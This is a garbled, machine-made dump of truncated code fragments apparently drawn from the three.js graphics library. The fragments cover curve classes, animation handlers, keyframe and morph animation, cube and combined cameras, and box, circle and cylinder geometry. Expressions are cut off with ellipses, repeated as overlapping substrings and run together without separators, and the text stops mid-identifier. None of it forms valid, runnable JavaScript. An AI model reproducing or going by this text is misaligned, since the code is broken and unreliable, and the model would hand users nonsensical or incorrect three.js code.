);THREE.Q ... otype )THREE.Q ... etPointvar tx, ty;tx = TH ... v2.x );tx = TH ... .v2.x )THREE.S ... .v2.x )this.v0.xthis.v1.xthis.v2.xty = TH ... v2.y );ty = TH ... .v2.y )THREE.S ... .v2.y )this.v0.ythis.v1.ythis.v2.yreturn  ... , ty );THREE.Q ... t;\r\n\r\n}THREE.Q ... TangentTHREE.C ... .v2.x )THREE.C ... cBezierTHREE.C ... .v2.y )var tan ... , ty );tangent ... x, ty )tangent.normalize();return tangent;THREE.C ... 3;\r\n\r\n}functio ... 3;\r\n\r\n}{\r\n\r\n\tt ... 3;\r\n\r\n}this.v3 = v3;this.v3 = v3tx = TH ... v3.x );tx = TH ... .v3.x )THREE.S ... .v3.x )this.v3.xty = TH ... v3.y );ty = TH ... .v3.y )THREE.S ... .v3.y )this.v3.yTHREE.C ... .v3.x )THREE.C ... .v3.y ){\r\n\r\n\tt ... s;\r\n\r\n}this.po ...  points(points ...  points(points ... efined)points == undefinedTHREE.S ... v;\r\n\r\n}THREE.S ... etPoint{\r\n\r\n\tv ... v;\r\n\r\n}var v = ... tor2();v = new ... ctor2()var c = [];var poi ... weight;points = this.pointspoint = ...  ) * t;point = ... 1 ) * t( point ... 1 ) * t( point ... h - 1 )intPoint == 0points.length - 2points.length -1points.length - 3v.x = T ... ight );v.x = T ... eight )THREE.C ... eight )THREE.C ... rpolatepoints[ c[ 0 ] ].xpoints[ c[ 0 ] ]points[ c[ 1 ] ].xpoints[ c[ 1 ] ]points[ c[ 2 ] ].xpoints[ c[ 2 ] ]points[ c[ 3 ] ].xpoints[ c[ 3 ] ]v.y = T ... ight );v.y = T ... eight )points[ c[ 0 ] ].ypoints[ c[ 1 ] ].ypoints[ c[ 2 ] ].ypoints[ c[ 3 ] ].yTHREE.E ... e;\r\n\r\n}this.aX = aX;this.aX = aXthis.aXthis.aY = aY;this.aY = aYthis.aYthis.xR ... Radius;this.xR ... xRadiusthis.xRadiusthis.yR ... Radius;this.yR ... yRadiusthis.yRadiusthis.aS ... tAngle;this.aS ... rtAnglethis.aStartAnglethis.aE ... dAngle;this.aE ... ndAnglethis.aEndAnglethis.aC ... ckwise;this.aC ... ockwisethis.aClockwiseTHREE.E ... etPointthis.aE ... rtAngleif ( de ... PI * 2;deltaAngle < 0deltaAn ... PI * 2;deltaAn ... .PI * 2Math.PI * 2this.aC ... == trueangle = ... ngle );angle = ... Angle )this.aE ... Angle )( 1 - t ... Angle )( Math. ... Angle )Math.PI ... taAnglethis.aS ... taAnglevar tx  ... ngle );tx = th ... angle )this.aX ... angle )this.xR ... angle )var ty  ... ngle );ty = th ... angle )this.aY ... angle )this.yR ... angle )THREE.A ...  );\r\n};THREE.A ... e );\r\n}THREE.ArcCurvefunctio ... e );\r\n}{\r\n\r\n\tT ... e );\r\n}THREE.E ... wise );THREE.E ... kwise )THREE.E ... ve.callTHREE.L ... }\r\n\r\n);THREE.L ... \t}\r\n\r\n)THREE.LineCurve3THREE.C ... \t}\r\n\r\n)var r = ... tor3();r = new ... ctor3()r.subVe ... s.v1 );r.subVe ... is.v1 )r.subVectorsr.multi ... r( t );r.multi ... ar( t )r.multiplyScalarr.add( this.v1 );r.add( this.v1 )r.addreturn r;THREE.Q ... }\r\n\r\n);THREE.Q ... \t}\r\n\r\n)THREE.Q ... rCurve3Quadrat ... rCurve3var tx, ty, tz;tz = TH ... v2.z );tz = TH ... .v2.z )THREE.S ... .v2.z )this.v0.zthis.v1.zthis.v2.zreturn  ... , tz );new THR ... y, tz )THREE.C ... }\r\n\r\n);THREE.C ... rCurve3tz = TH ... v3.z );tz = TH ... .v3.z )THREE.S ... .v3.z )this.v3.zTHREE.S ... }\r\n\r\n);THREE.S ... \t}\r\n\r\n)THREE.SplineCurve3var pt0 ... c[3] ];pt0 = points[ c[0] ]points[ c[0] ]c[0]pt1 = points[ c[1] ]points[ c[1] ]c[1]pt2 = points[ c[2] ]points[ c[2] ]c[2]pt3 = points[ c[3] ]points[ c[3] ]c[3]v.x = T ... eight);v.x = T ... weight)THREE.C ... weight)pt0.xpt1.xpt2.xpt3.xv.y = T ... eight);v.y = T ... weight)pt0.ypt1.ypt2.ypt3.yv.z = T ... eight);v.z = T ... weight)pt0.zpt1.zpt2.zpt3.zTHREE.C ...  }\r\n\r\n)THREE.C ... eCurve3point = ... 0 ) * t( point ... 0 ) * t( point ... h - 0 )points.length - 0intPoin ... length;intPoin ... .lengthintPoint > 0( Math. ... .length( Math. ... ) + 1 )Math.fl ... h ) + 1Math.fl ... ength )Math.ab ... .lengthMath.abs( intPoint )c[ 0 ]  ... length;c[ 0 ]  ... .length( intPo ... .length( intPoint - 1 )c[ 1 ]  ... length;c[ 1 ]  ... .length( intPoint )c[ 2 ]  ... length;c[ 2 ]  ... .length( intPoint + 1 )c[ 3 ]  ... length;c[ 3 ]  ... .length( intPoint + 2 )v.z = T ... ight );v.z = T ... eight )points[ c[ 0 ] ].zpoints[ c[ 1 ] ].zpoints[ c[ 2 ] ].zpoints[ c[ 3 ] ].zTHREE.A ... \n}() );THREE.A ... \r\n}() )THREE.A ... Handlervar playing = [];playing = []var library = {};library = {}var that    = {};that    = {}that.up ... \r\n\r\n\t};that.up ... }\r\n\r\n\t}that.updatei < playing.lengthplaying.lengthplaying ... meMS );playing ... imeMS )playing[ i ].updateplaying[ i ]that.ad ... \r\n\r\n\t};that.ad ... }\r\n\r\n\t}that.addToUpdateif ( pl ... \r\n\r\n\t\t}playing ...  === -1playing ... ation )playing.indexOfplaying ... tion );playing.pushthat.re ... \r\n\r\n\t};that.re ... }\r\n\r\n\t}that.re ... mUpdatevar ind ... tion );index = ... ation )playing ... x, 1 );playing ... ex, 1 )playing.splicethat.ad ... ;\r\n\r\n\t}that.addlibrary ... definedlibrary[ data.name ]console ... ng." );console ... ing." )"THREE. ... iting.""THREE. ... ta.name"THREE. ... ning! "THREE.AnimationHandler.add: Warning! " alrea ... iting." already exists in library. Overwriting.library ... = data;library ...  = datainitData( data );initData( data )that.re ... ;\r\n\r\n\t}that.removelibrary[ name ]"THREE. ... thing."" doesn ... thing." doesn't exists in library. Doing nothing.library ... efined;that.ge ... \r\n\r\n\t};that.ge ... }\r\n\r\n\t}that.gettypeof namethat.pa ... \r\n\r\n\t};that.pa ... ;\r\n\r\n\t}that.parsevar hierarchy = [];hierarchy = []if ( ro ... \r\n\r\n\t\t}root in ... nedMeshb < roo ... .lengthroot.sk ... .lengthroot.skeleton.bonesroot.skeletonb++hierarc ...  b ] );hierarc ... [ b ] )hierarchy.pushroot.sk ... es[ b ]parseRe ... rchy );parseRe ... archy )parseRe ... erarchyreturn hierarchy;var par ... ;\r\n\r\n\t}parseRe ... ;\r\n\r\n\t}hierarc ... root );hierarc ...  root )for ( v ... rchy );c < roo ... .lengthroot.children.lengthroot.childrenc++root.children[ c ]var ini ... \r\n\r\n\t};initDat ... ;\r\n\r\n\t}if ( da ... return;data.in ... == truedata.initializedh < dat ... .lengthdata.hi ... .lengthdata.hierarchyk < dat ... .lengthdata.hi ...  ].keysdata.hierarchy[ h ]if ( da ... \r\n\t\t\t\t}data.hi ... ime < 0data.hi ...  ].timedata.hi ... ys[ k ]data.hi ... me = 0;data.hi ... ime = 0data.hi ... rnion )data.hi ... defineddata.hi ... k ].rot!( data ... rnion )( data. ... rnion )data.hi ... ternionvar qua ...  ].rot;quat =  ... k ].rotdata.hi ... quat );data.hi ...  quat )new THR ...  quat )data.hi ... Targetsdata.hi ... ys[ 0 ]var use ... s = {};usedMor ... ts = {}m < dat ... .lengthvar m = 0var mor ... s[ m ];morphTa ... ts[ m ]data.hi ... ts[ m ]usedMor ... ] = -1;usedMor ...  ] = -1usedMor ... tName ]data.hi ... argets;var influences = {};influences = {}var morphTargetNameif ( da ... \t\t\t\t\t\t}data.hi ... getNameinfluen ... s[ m ];influen ... es[ m ]influen ... tName ]data.hi ... es[ m ]data.hi ... luencesif ( m  ... \t\t\t\t\t\t}m === d ... .lengthinfluen ...  ] = 0;influen ... e ] = 0data.hi ... uences;var k = 1k = 1data.hi ... k - 1 ]k - 1data.hi ... k, 1 );data.hi ...  k, 1 )data.hi ... .splicek --;k --data.hi ... ex = k;data.hi ... dex = kdata.hi ... ].indexdata.in ... = true;data.in ...  = truethat.LINEAR = 0;that.LINEAR = 0that.LINEARthat.CATMULLROM = 1;that.CATMULLROM = 1that.CATMULLROMthat.CA ... RD = 2;that.CA ... ARD = 2that.CA ... FORWARDreturn that;THREE.A ... R;\r\n\r\n}THREE.Animationfunctio ... R;\r\n\r\n}{\r\n\r\n\tt ... R;\r\n\r\n}this.root = root;this.root = rootthis.rootthis.da ... name );this.da ...  name )THREE.A ...  name )THREE.A ... ler.getthis.hi ... root );this.hi ...  root )this.hierarchyTHREE.A ...  root )THREE.A ... r.parsethis.currentTime = 0this.currentTimethis.timeScale = 1;this.timeScale = 1this.timeScalethis.is ...  false;this.is ... = falsethis.isPlayingthis.is ... = true;this.isPaused = truethis.isPausedthis.loop = true;this.loop = truethis.loopthis.weight = 0;this.weight = 0this.in ... LINEAR;this.in ... .LINEARthis.in ... ionTypeTHREE.A ... .LINEARTHREE.A ... scl" ];THREE.A ... "scl" ]THREE.A ... eyTypes[ "pos" ... "scl" ]THREE.A ... pe.playthis.cu ... me : 0;this.cu ... ime : 0startTi ... ime : 0startTi ... definedthis.we ... ght: 1;this.we ... ight: 1weight  ... ight: 1weight !== undefinedthis.reset();this.reset()THREE.A ... this );THREE.A ...  this )THREE.A ... oUpdateTHREE.A ... d;\r\n\r\n}THREE.A ... e.pause{\r\n\r\n\ti ... d;\r\n\r\n}this.is ... == trueTHREE.A ... mUpdatethis.is ... Paused;this.is ... sPaused!this.isPausedTHREE.A ... pe.stopTHREE.A ... }\r\n\r\n};THREE.A ... \t}\r\n\r\n}THREE.A ... e.resethl = th ... .lengththis.hi ... .lengthvar obj ... y[ h ];object  ... hy[ h ]this.hierarchy[ h ]object. ... onCacheobject. ... e = {};object. ... he = {}object. ... a.name]this.data.nameobject. ... ] = {};object. ... e] = {}object. ... l: 0 };object. ... cl: 0 }object. ... prevKey{ pos:  ... cl: 0 }pos: 0rot: 0scl: 0object. ... nextKeyobject. ... matrix;object. ... .matrixobject  ... .matrixobject.skinMatrixvar ani ... .name];animati ... a.name]t < 3var t = 0var typ ... s[ t ];type =  ... es[ t ]this.keyTypes[ t ]this.keyTypesvar pre ... s[ 0 ];prevKey ... ys[ 0 ]this.da ... ys[ 0 ]this.da ...  ].keysthis.da ... hy[ h ]this.data.hierarchyvar nex ... h, 1 );nextKey ...  h, 1 )this.ge ...  h, 1 )this.getNextKeyWithnextKey ... y.indexnextKey ... entTimenextKey.timenextKey.indexprevKey.indexprevKey = nextKey;prevKey = nextKeynextKey ...  + 1 );nextKey ... x + 1 )this.ge ... x + 1 )nextKey.index + 1animati ... revKey;animati ... prevKeyanimati ...  type ]animati ... extKey;animati ... nextKeyTHREE.A ... \r\n})();THREE.A ... \n\r\n})()THREE.A ... .update(functi ... \n\r\n})()(functi ... ;\r\n\r\n})var tar ... tor3();target  ... ctor3()var new ... tor3();newVect ... ctor3()var new ... nion();newQuat ... rnion()interpo ... mullRomv3 = []point = ...  scale;point = ... * scale( point ... * scalepa = po ...  0 ] ];pa = po ... [ 0 ] ]pb = po ...  1 ] ];pb = po ... [ 1 ] ]pc = po ...  2 ] ];pc = po ... [ 2 ] ]pd = po ...  3 ] ];pd = po ... [ 3 ] ]v3[ 0 ] ... , w3 );v3[ 0 ] ... 2, w3 )pa[ 0 ]pb[ 0 ]pc[ 0 ]pd[ 0 ]v3[ 1 ] ... , w3 );v3[ 1 ] ... 2, w3 )pa[ 1 ]pb[ 1 ]pc[ 1 ]pd[ 1 ]v3[ 2 ] ... , w3 );v3[ 2 ] ... 2, w3 )pa[ 2 ]pb[ 2 ]pc[ 2 ]pd[ 2 ]{\r\n\t\tif ... ;\r\n\r\n\t}this.cu ... eScale;this.cu ... meScaledelta * ... meScalethis.weight === 0var vector;var dur ... length;duratio ... .lengththis.data.lengththis.lo ... urationthis.loop === truethis.cu ... urationthis.cu ... ration;this.loop === falsethis.stop();this.stop()this.stoptype    ... es[ t ]var pre ... type ];prevKey ...  type ]var nex ... type ];nextKey ...  type ]if ( ne ... \r\n\t\t\t\t}prevKey ... s[ 0 ];nextKey ... h, 1 );while ( ... \n\t\t\t\t\t}var sca ... time );scale = ... .time )( this. ... .time )this.cu ... ey.timeprevKey.time( nextK ... .time )nextKey ... ey.timeprevXYZ ...  type ]prevKey[ type ]nextXYZ ...  type ]nextKey[ type ]if ( sc ... le = 0;scale < 0scale = 0;scale = 0if ( sc ... le = 1;scale > 1if ( ty ... \r\n\t\t\t\t}type === "pos"vector  ... sition;vector  ... ositionnewVect ...  scale;newVect ... * scalenewVector.xprevXYZ ... * scaleprevXYZ[ 0 ]( nextX ... * scale( nextX ... [ 0 ] )nextXYZ ... YZ[ 0 ]nextXYZ[ 0 ]newVector.yprevXYZ[ 1 ]( nextX ... [ 1 ] )nextXYZ ... YZ[ 1 ]nextXYZ[ 1 ]newVector.zprevXYZ[ 2 ]( nextX ... [ 2 ] )nextXYZ ... YZ[ 2 ]nextXYZ[ 2 ]if (obj ... Vector;var pro ... ight );proport ... eight )this.we ... eight )this.we ... sWeightobject. ... sWeightvector. ... ight );vector. ... eight )vector.lerpobject. ... weight;object. ... .weightvector = newVector;vector = newVectorthis.in ... FORWARDthis.in ... MULLROMTHREE.A ... MULLROMTHREE.A ... FORWARDpoints[ ... pos" ];points[ ... "pos" ]this.ge ... "pos" ]this.ge ... x - 1 )this.getPrevKeyWithprevKey.index - 1points[ ... revXYZ;points[ ... prevXYZpoints[ 1 ]points[ ... extXYZ;points[ ... nextXYZpoints[ 2 ]points[ 3 ]scale = ... + 0.33;scale = ...  + 0.33scale * 0.33 + 0.33scale * 0.33var cur ... cale );current ... scale )interpo ... scale )if ( ob ... ht = 1;var pro ... ht = 1;proport ... ght = 1vector. ... Weight;vector. ... lWeight( curre ... lWeight( curre ... tor.x )current ... ector.xcurrentPoint[ 0 ]( curre ... tor.y )current ... ector.ycurrentPoint[ 1 ]( curre ... tor.z )current ... ector.zcurrentPoint[ 2 ]if ( th ... \t\t\t\t\t\t}var for ... 1.01 );forward ...  1.01 )interpo ...  1.01 )scale * 1.01target. ...  2 ] );target. ... [ 2 ] )target.setforwardPoint[ 0 ]forwardPoint[ 1 ]forwardPoint[ 2 ]target. ... ctor );target.sub( vector )target.subtarget.y = 0;target.y = 0target.ytarget.normalize();target.normalize()target.normalizevar ang ... et.z );angle = ... get.z )Math.at ... get.z )target.xtarget.zobject. ... e, 0 );object. ... le, 0 )object.rotation.settype === "rot"THREE.Q ... cale );THREE.Q ... scale )if ( !( ... \n\t\t\t\t\t}object. ... wQuat);object. ... ewQuat)object. ... t === 0object. ... tWeightthis.we ... tWeightTHREE.Q ... ight );THREE.Q ... eight )type === "scl"vector  ... .scale;vector  ... t.scaleif ( ob ... Vector;var pro ... eight);proport ... Weight)this.we ... Weight)( this. ... Weight)this.we ... lWeightobject. ... lWeightTHREE.A ... ];\r\n\r\n}THREE.A ... KeyWithvar key ... ].keys;keys =  ...  ].keyskey = k ... th - 1;key = k ... gth - 1key < k ... gth - 1keys.length - 1keys.lengthkey = k ... length;key = k ... .lengthkey % keys.lengthfor ( ; ... }\r\n\r\n\t}key < keys.lengthkey++if ( ke ... \r\n\r\n\t\t}keys[ k ... definedkeys[ key ][ type ]keys[ key ]return keys[ key ];return  ... s[ 0 ];key = k ... ey : 0;key = k ... key : 0key > 0 ? key : 0key > 0key >=  ... .lengthkey >= 0key + keys.lengthkey --this.da ... h - 1 ]THREE.K ... }\r\n\r\n};THREE.K ... \t}\r\n\r\n}THREE.K ... imationthis.da ... data );this.da ...  data )THREE.A ...  data )this.ti ...  0.001;this.ti ... = 0.001var key ... chy[h];keys =  ... h].keysthis.da ... h].keysthis.da ... rchy[h]sids =  ... h].sidsthis.da ... h].sidsobj = t ... rchy[h]this.hierarchy[h]keys.length && sidss < sids.lengthsids.lengthvar s = 0s = 0var sid ... h, 0 );sid = sids[ s ]sids[ s ]next =  ...  h, 0 )this.ge ...  h, 0 )next.apply( sid );next.apply( sid )next.applyobj.mat ...  false;obj.mat ... = falseobj.matrixAutoUpdatethis.da ... trix();this.da ... atrix()this.da ... eMatrixthis.da ... h].nodeobj.mat ... = true;obj.mat ...  = trueobj.mat ... sUpdateTHREE.K ... ;\r\n\r\n};THREE.K ... );\r\n\r\n}THREE.K ... pe.playTHREE.K ... ototypevar h,  ... \t\tnode;for ( h ... \r\n\r\n\t\t}h++object  ... y[ h ];node =  ... y[ h ];node =  ... hy[ h ]node.an ... definednode.animationCachenode.an ... e = {};node.an ... he = {}node.an ... = null;node.an ...  = nullnode.an ... prevKeynode.an ... nextKeynode.an ... matrix;node.an ... .matrixnode.an ... lMatrixif (key ... \n\r\n\t\t\t}node.an ... s[ 0 ];node.an ... ys[ 0 ]keys[ 0 ]node.an ... s[ 1 ];node.an ... ys[ 1 ]keys[ 1 ]this.st ... Time );this.st ... tTime )Math.mi ... tTime )keys[0].timekeys[0]this.en ... Time );this.en ... dTime )this.endTimeMath.ma ... dTime )keys[ke ... 1].timekeys[ke ... th - 1]this.update( 0 );this.update( 0 )THREE.K ... d;\r\n\r\n}THREE.K ... e.pauseif( thi ... ;\r\n\r\n\t}THREE.K ... pe.stoph < thi ... .lengthobj = t ... hy[ h ]var nod ... y[ h ];var ori ... Matrix;origina ... lMatrixif( obj ... \n\r\n\t\t\t}obj ins ... EE.Boneorigina ... trix );origina ... atrix )original.copyobj.skinMatrixobj.ski ... iginal;obj.ski ... riginalobj.matrixobj.mat ... iginal;obj.mat ... riginaldelete  ... nCache;delete  ... onCacheTHREE.K ... .updatethis.cu ... tion );this.cu ... ation )Math.mi ... ation )var key ... nCache;keys = node.keysnode.keysanimati ... onCachevar pre ... revKey;prevKey ... prevKeyvar nex ... extKey;nextKey ... nextKeywhile ( ... \r\n\t\t\t\t}nextKey ...  + 1 ];nextKey ... x + 1 ]keys[ p ... x + 1 ]prevKey.index + 1prevKey ... Time );prevKey ... tTime )prevKey.interpolateprevKey ... time );prevKey ... .time )this.da ...  ].nodeTHREE.K ... ];\r\n\r\n}THREE.K ... KeyWithkeys[ k ... ( sid )keys[ k ... sTargetreturn keys[ 0 ];key--keys[ k ... h - 1 ]THREE.MorphAnimationthis.mesh = mesh;this.mesh = meshthis.meshthis.fr ... length;this.fr ... .lengththis.framesmesh.mo ... .lengthmesh.mo ... luencesTHREE.M ... )\r\n\r\n};THREE.M ... ()\r\n\r\n}{\r\n\r\n\tp ... ()\r\n\r\n}play: f ... ;\r\n\r\n\t}pause:  ... se;\r\n\t}functio ... se;\r\n\t}{\r\n\r\n\t\t ... se;\r\n\t}update: ... \n\t} )()var lastFrame = 0;lastFrame = 0var cur ... me = 0;currentFrame = 0this.cu ...  delta;this.cu ... = deltavar int ... frames;interpo ... .framesthis.du ... .framesvar fra ... tion );frame = ... ation )Math.fl ... ation )this.cu ... olationframe ! ... ntFramethis.me ...  ] = 0;this.me ... e ] = 0this.me ... Frame ]this.me ... luencesthis.me ...  ] = 1;this.me ... e ] = 1this.me ... frame ]lastFra ... tFrame;lastFra ... ntFramecurrent ...  frame;currentFrame = framethis.me ... lation;this.me ... olation( this. ... olation( this. ... ation )this.me ... rame ];1 - thi ... frame ]THREE.CubeCameravar fov ... ct = 1;fov = 90aspect = 1var cam ...  far );cameraP ... , far )new THR ... , far )cameraP ... 1, 0 );cameraP ... -1, 0 )cameraPX.up.setcameraPX.upcameraP ...  0 ) );cameraP ... , 0 ) )cameraPX.lookAtthis.ad ... raPX );this.add( cameraPX )cameraN ... , far )cameraN ... 1, 0 );cameraN ... -1, 0 )cameraNX.up.setcameraNX.upcameraN ...  0 ) );cameraN ... , 0 ) )cameraNX.lookAtthis.ad ... raNX );this.add( cameraNX )cameraP ... 0, 1 );cameraP ...  0, 1 )cameraPY.up.setcameraPY.upcameraPY.lookAtthis.ad ... raPY );this.add( cameraPY )cameraN ... , -1 );cameraN ... 0, -1 )cameraNY.up.setcameraNY.upcameraNY.lookAtthis.ad ... raNY );this.add( cameraNY )cameraPZ.up.setcameraPZ.upcameraP ...  1 ) );cameraP ... , 1 ) )cameraPZ.lookAtthis.ad ... raPZ );this.add( cameraPZ )cameraNZ.up.setcameraNZ.upcameraN ... -1 ) );cameraN ...  -1 ) )cameraNZ.lookAtnew THR ... 0, -1 )this.ad ... raNZ );this.add( cameraNZ )this.re ... er } );this.re ... ter } )this.renderTargetnew THR ... ter } ){ forma ... ilter }this.updateCubeMapvar ren ... Target;renderT ... rTargetvar gen ... ipmaps;generat ... MipmapsrenderT ...  false;renderT ... = falserenderT ... ce = 0;renderT ... ace = 0rendere ... rget );rendere ... arget )renderT ... ce = 1;renderT ... ace = 1renderT ... ce = 2;renderT ... ace = 2renderT ... ce = 3;renderT ... ace = 3renderT ... ce = 4;renderT ... ace = 4renderT ... ipmaps;renderT ... ce = 5;renderT ... ace = 5THREE.CombinedCamera{\r\n\r\n\tT ... t;\r\n\r\n}this.fov = fov;this.fov = fovthis.le ... th / 2;this.le ... dth / 2-width / 2-widththis.ri ... dth / 2width / 2this.to ... ht / 2;this.to ... ght / 2height / 2this.bo ... ht / 2;this.bo ... ght / 2-height / 2-heightthis.ca ... oFar );this.ca ... hoFar )this.cameraOnew THR ... hoFar )width / - 2height / - 2this.ca ...  far );this.ca ... , far )this.cameraPwidth / heightthis.zoom = 1;this.zoom = 1this.zoomthis.to ... tive();this.toPerspective()this.toPerspectivevar asp ... height;aspect  ... /heightwidth/heightTHREE.C ... pective{\r\n\r\n\t/ ... e;\r\n\r\n}this.ne ... P.near;this.ne ... aP.nearthis.cameraP.nearthis.fa ... aP.far;this.fa ... raP.farthis.cameraP.farthis.ca ... .zoom ;this.ca ... is.zoomthis.cameraP.fovthis.fov / this.zoomthis.ca ... trix();this.ca ... atrix()this.ca ... nMatrixthis.pr ... Matrix;this.in ... = true;this.in ...  = truethis.in ... iveModethis.in ... = falsethis.in ... hicModeTHREE.C ... graphicvar fov = this.fov;fov = this.fovvar asp ... aspect;aspect  ... .aspectthis.cameraP.aspectvar nea ... P.near;near =  ... aP.nearvar far ... aP.far;far = t ... raP.farvar hyp ...  ) / 2;hyperfo ... r ) / 2( near + far ) / 2( near + far )near + farvar hal ... rfocus;halfHei ... erfocusMath.ta ... erfocusMath.tan( fov / 2 )fov / 2var pla ... Height;planeHe ... fHeight2 * halfHeightvar pla ... aspect;planeWi ...  aspectplaneHeight * aspectvar hal ... th / 2;halfWid ... dth / 2planeWidth / 2halfHei ... s.zoom;halfHei ... is.zoomhalfWid ... s.zoom;halfWid ... is.zoomthis.ca ... fWidth;this.ca ... lfWidththis.cameraO.left-halfWidththis.cameraO.rightthis.ca ... Height;this.ca ... fHeightthis.cameraO.topthis.cameraO.bottom-halfHeightthis.ne ... O.near;this.ne ... aO.nearthis.cameraO.nearthis.fa ... aO.far;this.fa ... raO.farthis.cameraO.farTHREE.C ... 2;\r\n\r\n}THREE.C ... setSizethis.ca ... height;this.ca ...  heightTHREE.C ... .setFovthis.to ... phic();this.to ... aphic()this.toOrthographicTHREE.C ... nMatrixTHREE.C ... ov;\r\n};THREE.C ... fov;\r\n}THREE.C ... setLensfunctio ... fov;\r\n}{\r\n\r\n\ti ... fov;\r\n}var fov ...  ) ) );fov = 2 ... 2 ) ) )this.setFov( fov );this.setFov( fov )this.setFovreturn fov;THREE.C ... setZoomthis.zoom = zoom;this.zoom = zoomTHREE.C ... ontViewthis.rotation.x = 0;this.rotation.x = 0this.rotation.xthis.rotation.y = 0;this.rotation.y = 0this.rotation.ythis.rotation.z = 0;this.rotation.z = 0this.rotation.zthis.ro ...  false;this.ro ... = falseTHREE.C ... ackViewthis.ro ... ath.PI;this.ro ... Math.PITHREE.C ... eftViewthis.ro ... PI / 2;this.ro ... .PI / 2- Math.PI / 2- Math.PITHREE.C ... ghtViewMath.PI / 2THREE.C ... TopViewTHREE.C ... tomViewTHREE.G ... this );THREE.G ...  this )THREE.Geometry.callthis.pa ... ts\r\n\t};this.pa ... nts\r\n\t}this.parameters{\r\n\t\twi ... nts\r\n\t}depth: depthwidthSe ... egmentsheightS ... egmentsdepthSe ... egmentsthis.wi ... s || 1;this.wi ... ts || 1this.widthSegmentswidthSegments || 1this.he ... s || 1;this.he ... ts || 1this.heightSegmentsheightSegments || 1this.de ... s || 1;this.de ... ts || 1this.depthSegmentsdepthSegments || 1var wid ... th / 2;width_h ... dth / 2var hei ... ht / 2;height_ ... ght / 2var dep ... th / 2;depth_h ... pth / 2depth / 2buildPl ... f, 0 );buildPl ... lf, 0 )buildPl ... f, 1 );buildPl ... lf, 1 )- width_halfbuildPl ... f, 2 );buildPl ... lf, 2 )buildPl ... f, 3 );buildPl ... lf, 3 )- height_halfbuildPl ... f, 4 );buildPl ... lf, 4 )buildPl ... f, 5 );buildPl ... lf, 5 )- depth_halfvar w,  ... length;gridX = ... egmentsscope.widthSegmentsgridY = ... egmentsscope.heightSegmentsoffset  ... .lengthscope.v ... .lengthscope.vertices( u === ... = 'x' )( u === ... = 'y' )u === ' ... === 'y'u === 'x'v === 'y'u === ' ... === 'x'u === 'y'v === 'x'w = 'z';w = 'z'( u === ... = 'z' )u === ' ... === 'z'v === 'z'u === 'z'w = 'y';w = 'y'gridY = ... gments;scope.depthSegmentsw = 'x';w = 'x'gridX = ... gments;var gri ... tor3();gridX1 = gridX + 1gridX + 1gridY1 = gridY + 1gridY + 1segment ... / gridXwidth / gridXsegment ... / gridYheight / gridYnormal[ ...  : - 1;normal[ ... 1 : - 1normal[ w ]depth > 0 ? 1 : - 1depth > 0iy < gridY1iy ++iy = 0ix < gridX1ix ++ix = 0vector[ ... * udir;vector[ ...  * udirvector[ u ]( ix *  ...  * udir( ix *  ... _half )ix * se ... th_halfix * segment_widthvector[ ... * vdir;vector[ ...  * vdirvector[ v ]( iy *  ...  * vdir( iy *  ... _half )iy * se ... ht_halfiy * segment_heightvector[ w ] = depth;vector[ w ] = depthvector[ w ]scope.v ... ctor );scope.v ... ector )scope.vertices.pushiy < gridYiy++ix < gridXix++var a = ... 1 * iy;a = ix + gridX1 * iyix + gridX1 * iygridX1 * iyvar b = ...  + 1 );b = ix  ... y + 1 )ix + gr ... y + 1 )gridX1 * ( iy + 1 )( iy + 1 )iy + 1var c = ...  + 1 );c = ( i ... y + 1 )( ix +  ... y + 1 )( ix + 1 )ix + 1var d = ... 1 * iy;d = ( i ... X1 * iy( ix +  ... X1 * iyvar uva ... ridY );uva = n ... gridY )new THR ... gridY )ix / gridX1 - iy / gridYiy / gridYvar uvb ... ridY );uvb = n ... gridY )1 - ( i ... / gridY( iy + 1 ) / gridYvar uvc ... ridY );uvc = n ... gridY )( ix + 1 ) / gridXvar uvd ... ridY );uvd = n ... gridY )var fac ... fset );face =  ... ffset )a + offsetb + offsetd + offsetface.ve ... ne() );face.ve ... one() )normal.clone()normal.clonescope.f ... face );scope.f ...  face )scope.faces.pushscope.facesscope.f ... vd ] );scope.f ... uvd ] )scope.f ...  ].pushscope.f ... vs[ 0 ]scope.faceVertexUvs[ uva, uvb, uvd ]face =  ... fset );c + offsetscope.f ... () ] );scope.f ... e() ] )[ uvb.c ... one() ]uvb.clone()uvb.cloneuvd.clone()uvd.clonethis.me ... ices();this.mergeVertices()this.mergeVerticesthis.pa ... th\r\n\t};this.pa ... gth\r\n\t}{\r\n\t\tra ... gth\r\n\t}radius: radiussegments: segmentsthetaSt ... taStartthetaLe ... aLengthradius  ...  || 50;radius  ... s || 50radius || 50segment ...  ) : 8;segment ... s ) : 8segment ... definedMath.ma ... ments )thetaSt ... rt : 0;thetaSt ... art : 0thetaSt ... definedthetaLe ... PI * 2;thetaLe ... .PI * 2thetaLe ... definedvar i,  ...  0.5 );center  ... ctor3()centerU ... , 0.5 )new THR ... , 0.5 )this.ve ... enter);this.ve ... center)this.vertices.pushuvs.pus ... erUV );uvs.push( centerUV )i <= segmentssegment ... aLengththetaSt ... aLengthi / seg ... aLengthi / segmentsvertex. ... ment );vertex. ... gment )radius  ... gment )Math.cos( segment )Math.sin( segment )this.ve ... rtex );this.ve ... ertex )uvs.pus ...  2 ) );uvs.pus ... / 2 ) )new THR ... ) / 2 )( verte ... 1 ) / 2( verte ... s + 1 )vertex. ... ius + 1vertex.x / radiusvertex.y / radiusvar n = ... 0, 1 );n = new ...  0, 1 )this.fa ...  ] ) );this.fa ... ) ] ) )this.faces.pushnew THR ... e() ] )[ n.clo ... one() ]n.clone()n.clonethis.fa ... () ] );this.fa ... e() ] )this.fa ...  ].push[ uvs[  ... one() ]uvs[ i ].clone()uvs[ i ].cloneuvs[ i + 1 ].clone()uvs[ i + 1 ].clonecenterUV.clone()centerUV.clonethis.co ... mals();this.co ... rmals()this.co ... Normalsthis.bo ... dius );this.bo ... adius )new THR ... adius )THREE.C ... );\r\n };THREE.C ...  );\r\n }THREE.CubeGeometryfunctio ...  );\r\n }{\r\n\tcon ...  );\r\n }DEPRECATED: THREE.CubeGeometry is deprecated. Use THREE.BoxGeometry instead.DEPRECATED: THREECubeGeometry is deprecatedBoxGeometry insteadreturn  ... ents );this.pa ... ed\r\n\t};this.pa ... ded\r\n\t}{\r\n\t\tra ... ded\r\n\t}radiusTop: radiusTopradiusB ... sBottomradialS ... egmentsopenEnded: openEndedradiusT ... p : 20;radiusT ... op : 20radiusT ... definedradiusB ... m : 20;radiusB ... om : 20radiusB ... definedheight  ...  : 100;height  ... t : 100height !== undefinedradialS ... s || 8;radialS ... ts || 8radialSegments || 8heightS ... s || 1;heightS ... ts || 1openEnd ...  